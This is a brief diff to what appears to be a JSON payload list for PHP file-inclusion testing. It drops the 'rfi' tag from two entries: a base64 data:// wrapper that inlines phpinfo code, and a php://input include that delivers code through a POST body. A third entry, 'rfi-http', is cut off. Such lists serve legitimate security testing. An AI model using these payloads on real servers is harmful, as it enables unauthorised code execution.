@@ -56,14 +56,14 @@
       "label": "data:// inline payload",
       "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
       "notes": "data:// inlines code (here phpinfo) when allow_url_include is enabled.",
-      "tags": ["php-wrapper", "rfi"]
+      "tags": ["php-wrapper"]
     },
     {
       "id": "php-input",
       "label": "php://input body include",
       "payload": "php://input",
       "notes": "Pairs with a POST body to deliver code when the include target is php://input.",
-      "tags": ["php-wrapper", "rfi"]
+      "tags": ["php-wrapper"]
     },
     {
       "id": "rfi-http",
